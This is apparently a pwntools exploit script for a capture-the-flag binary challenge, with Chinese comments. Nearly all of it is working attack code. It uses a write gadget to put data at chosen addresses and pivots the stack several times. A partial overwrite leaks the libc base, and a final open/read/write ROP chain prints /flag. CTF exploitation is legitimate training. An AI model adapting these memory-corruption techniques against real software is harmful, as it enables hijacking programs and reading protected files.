#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/CTF_PWN/PROJECT/vn面试/1/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  #gdb.attach(io)
    print(f"[*] 进程ID: {io.pid}")
    pause()
def pulse():
    sleep(0.5)

# [+] ================== Some addr  ============== [+]
arb_write_4_qwords_gadget = 0x401295
leave_ret = 0x401286
start = elf.sym["_start"]
libc_leave_ret_lower = 0x99d2
libc_pop_rdi = 0xd0f75b
libc_puts_addr =  0xc87be0 #  0x7ffff7c87be0
pop_rbp = 0x4012B1
ret = 0x401287

phase_1_rsp = 0x404800
phase_2_rsp = 0x404300
phase_3_rsp = 0x404d00
phase_4_rsp = 0x404f00
buffer = 0x404080


def write_to_data(addr,data,Ipause,restart):
    assert len(data)<= 0x20
    s(p64(0)*2+p64(addr+8)+p64(arb_write_4_qwords_gadget))
    s(data)
    if len(data)<0x20:
        if Ipause:
            pause()
        else:
            pulse()
    if restart:
        io.send(p64(0)*3 + p64(elf.sym['_start']))

def write_to_long_data(addr,data,Ipause=False,restart=True):
    for i in range(0,len(data),0x20):
        write_to_data(addr+i,data[i:i+0x20],Ipause,restart)

def stack_mov(new_rsp):
    s(p64(0)*2+p64(new_rsp-0x8)+p64(leave_ret))

# ========== Exploit 开始 ==========
def exp():    
    write_to_long_data(phase_1_rsp,p64(start)+p64(0)*5+p64(start)+p64(0)+b'/flag\x00')
    write_to_long_data(phase_2_rsp,p64(elf.sym["main"])*4*10)
    write_to_long_data(phase_3_rsp,p64(elf.sym["main"])*4*30)
    stack_mov(phase_1_rsp)
    s(p64(0)*2+p64(phase_1_rsp+0x30-0x8)+p16(libc_leave_ret_lower))
    s(p64(0)+p64(0)+p64(phase_2_rsp - 0x8)+p16(libc_leave_ret_lower))
    write_to_long_data(phase_1_rsp-0x108,p32(libc_pop_rdi)[:3],restart=False)
    
    write_to_long_data(phase_1_rsp-0x100,p64(elf.got.read)+p64(ret)*4+p32(libc_puts_addr)[:3],restart=False)
    
    write_to_long_data(phase_1_rsp-0x100+8*6,p64(pop_rbp)+p64(phase_3_rsp-8)+p64(leave_ret),restart=False)
    pause()
    
    stack_mov(phase_1_rsp-0x108)

    base = l64()-libc.sym.read
    leak("base",base)
    # [+] ============ Some addr =============== [+]
    
    pop_rdi_ret = base + 0x000000000010f75b
    pop_rsi_ret = base + 0x0000000000110a4d
    pop_rdx_leave_ret = base + 0x00000000000981ad
    flag_path = phase_1_rsp + 8*8
    buffer = phase_3_rsp + 0x50
    pause()
    write_to_long_data(phase_4_rsp,
        p64(pop_rdi_ret) + p64(flag_path) +
        p64(pop_rsi_ret) + p64(0) +
        p64(base + libc.sym['open']) +
        p64(pop_rdi_ret) + p64(3) +
        p64(pop_rsi_ret) + p64(buffer) +
        p64(pop_rbp) + p64(phase_4_rsp + 13*8 - 8) +
        p64(pop_rdx_leave_ret) + p64(0x80) +
        p64(base + libc.sym['read']) + 
        p64(pop_rdi_ret) + p64(1) +
        p64(pop_rsi_ret) + p64(buffer) +
        p64(pop_rbp) + p64(phase_4_rsp + 22*8 - 8) +
        p64(pop_rdx_leave_ret) + p64(0x80) +
        p64(base + libc.sym['write']), restart=False)
 
    stack_mov(phase_4_rsp)
 
    pause()
exp()
itr()
